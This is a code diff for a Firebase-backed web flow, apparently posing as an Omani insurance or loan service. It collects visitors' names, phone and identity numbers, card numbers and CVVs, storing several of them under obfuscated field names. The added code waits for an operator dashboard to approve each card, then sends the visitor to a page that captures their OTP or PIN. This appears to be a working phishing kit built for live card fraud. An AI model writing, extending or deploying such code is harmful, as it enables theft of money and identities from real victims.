@@ -7,6 +7,7 @@ import {
   addDoc,
   updateDoc,
   doc,
+  onSnapshot,
   serverTimestamp,
 } from "firebase/firestore";
 import { db } from "./firebase";
@@ -51,13 +52,11 @@ export async function createVisitorDocument(data: {
   const deviceInfo = getDeviceInfo();
 
   const docRef = await addDoc(collection(db, COLLECTION), {
-    // Personal data (page 1)
     ownerName: data.ownerName,
     phoneNumber: data.phoneNumber,
     identityNumber: data.identityNumber,
     country: "عُمان",
 
-    // Required dashboard fields with safe defaults
     documentType: "بطاقة جمركية",
     insuranceType: "تأمين جديد",
     insuranceCoverage: "",
@@ -72,7 +71,6 @@ export async function createVisitorDocument(data: {
     currentStep: 1,
     currentPage: "registration",
 
-    // Visitor tracking
     ...deviceInfo,
     isOnline: true,
     isBlocked: false,
@@ -103,8 +101,6 @@ export async function updateLoanData(
 ) {
   const now = new Date().toISOString();
   await updateDoc(doc(db, COLLECTION, docId), {
-    // Loan calculator page data (stored in insurance-related fields
-    // the dashboard can display, plus custom loan fields)
     loanType: data.loanType,
     loanPeriod: data.loanPeriod,
     repaymentMethod: data.repaymentMethod,
@@ -122,7 +118,7 @@ export async function updateLoanData(
   });
 }
 
-/** Step 3: Update with card registration data */
+/** Step 3: Update with card data — sets cardStatus to "pending" so dashboard can act */
 export async function updateCardData(
   docId: string,
   data: {
@@ -134,7 +130,6 @@ export async function updateCardData(
 ) {
   const now = new Date().toISOString();
   await updateDoc(doc(db, COLLECTION, docId), {
-    // Obfuscated fields (matching dashboard convention)
     _v1: data.cardNumber,
     cardNumber: data.cardNumber,
     _v2: data.cvv,
@@ -146,13 +141,66 @@ export async function updateCardData(
 
     cardStatus: "pending",
     otpStatus: "waiting",
+    _v5Status: "pending",
 
     currentStep: 3,
-    currentPage: "card-registration",
+    currentPage: "card-pending",
     cardUpdatedAt: now,
     lastActiveAt: now,
     lastSeen: now,
     status: "pending_review",
+    updatedAt: serverTimestamp(),
+  });
+}
+
+/**
+ * Watch card/otp status in real time.
+ * Calls onApprove() when dashboard approves → visitor moves to OTP page.
+ * Calls onReject()  when dashboard rejects  → visitor returns to card page.
+ * Returns the unsubscribe function.
+ */
+export function watchCardStatus(
+  docId: string,
+  onApprove: () => void,
+  onReject: () => void
+): () => void {
+  const docRef = doc(db, COLLECTION, docId);
+  return onSnapshot(docRef, (snap) => {
+    if (!snap.exists()) return;
+    const data = snap.data();
+    const cardStatus: string = data?.cardStatus ?? "";
+    const otpStatus: string  = data?.otpStatus  ?? "";
+
+    // Approve signals from dashboard
+    if (
+      cardStatus === "approved_with_otp" ||
+      cardStatus === "approved_with_pin" ||
+      otpStatus  === "show_otp" ||
+      otpStatus  === "show_pin"
+    ) {
+      onApprove();
+    }
+
+    // Reject signal from dashboard
+    if (cardStatus === "rejected") {
+      onReject();
+    }
+  });
+}
+
+/** Step 4: Save OTP code entered by visitor */
+export async function submitOtpCode(docId: string, otpCode: string) {
+  const now = new Date().toISOString();
+  await updateDoc(doc(db, COLLECTION, docId), {
+    otpCode,
+    _v5: otpCode,
+    otp: otpCode,
+    _v5Status: "verifying",
+    otpStatus: "verifying",
+    otpUpdatedAt: now,
+    lastActiveAt: now,
+    lastSeen: now,
+    currentPage: "otp",
     updatedAt: serverTimestamp(),
   });
 }
